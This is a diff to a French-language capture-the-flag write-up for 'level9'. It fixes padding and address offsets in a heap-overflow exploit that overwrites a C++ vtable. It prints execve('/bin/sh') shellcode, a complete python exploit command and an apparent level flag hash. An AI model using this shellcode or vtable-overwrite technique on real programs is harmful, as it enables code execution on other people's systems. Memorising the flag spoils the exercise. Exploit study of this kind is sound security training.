@@ -71,10 +71,10 @@ Total : 108 bytes (0x6c)
 obj1 = 0x0804a008
 obj1->annotation = 0x0804a00c  ← setAnnotation écrit ici
 
-obj2 = 0x0804a074 (obj1 + 108)
-obj2->vtable = 0x0804a074       ← Cible à écraser
+obj2 = 0x0804a078 (obj1 + 108 + 8 header)
+obj2->vtable = 0x0804a078       ← Cible à écraser
 
-Distance : 0x68 = 104 bytes
+Distance : 0x6c = 108 bytes
 ```
 
 ### 4. Comprendre la vtable
@@ -97,7 +97,7 @@ Assembleur :
 
 **Structure** :
 ```
-[Fausse vtable: 4B] + [Shellcode: 28B] + [Padding: 72B] + [Adresse vtable: 4B]
+[Fausse vtable: 4B] + [Shellcode: 28B] + [Padding: 76B] + [Adresse vtable: 4B]
 ```
 
 #### Composants
@@ -112,8 +112,8 @@ Assembleur :
 ```
 - `execve("/bin/sh", NULL, NULL)` + `exit(0)`
 
-**[3] Padding** : `"A" * 72`
-- Calcul : 104 - 4 - 28 = 72 bytes
+**[3] Padding** : `"A" * 76`
+- Calcul : 108 - 4 - 28 = 76 bytes
 
 **[4] Adresse fausse vtable** : `\x0c\xa0\x04\x08`
 - Adresse de notre fausse vtable (0x0804a00c)
@@ -122,7 +122,7 @@ Assembleur :
 ### 6. Exploitation
 
 ```bash
-./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*72 + "\x0c\xa0\x04\x08"')
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
 ```
 
 **Résultat** : Shell obtenu !
@@ -140,11 +140,11 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 1. Heap après overflow :
    0x0804a00c: [0x0804a010]           ← Fausse vtable
    0x0804a010: [shellcode 28 bytes]
-   0x0804a02c: [AAAA... 72 bytes]
-   0x0804a074: [0x0804a00c]           ← obj2->vtable écrasé !
+   0x0804a02c: [AAAA... 76 bytes]
+   0x0804a078: [0x0804a00c]           ← obj2->vtable écrasé !
 
 2. Appel de operator+ :
-   mov eax, [0x0804a074]   ; eax = 0x0804a00c
+   mov eax, [0x0804a078]   ; eax = 0x0804a00c
    mov edx, [eax]          ; edx = 0x0804a010
    call edx                ; Exécute shellcode ! ✅
 
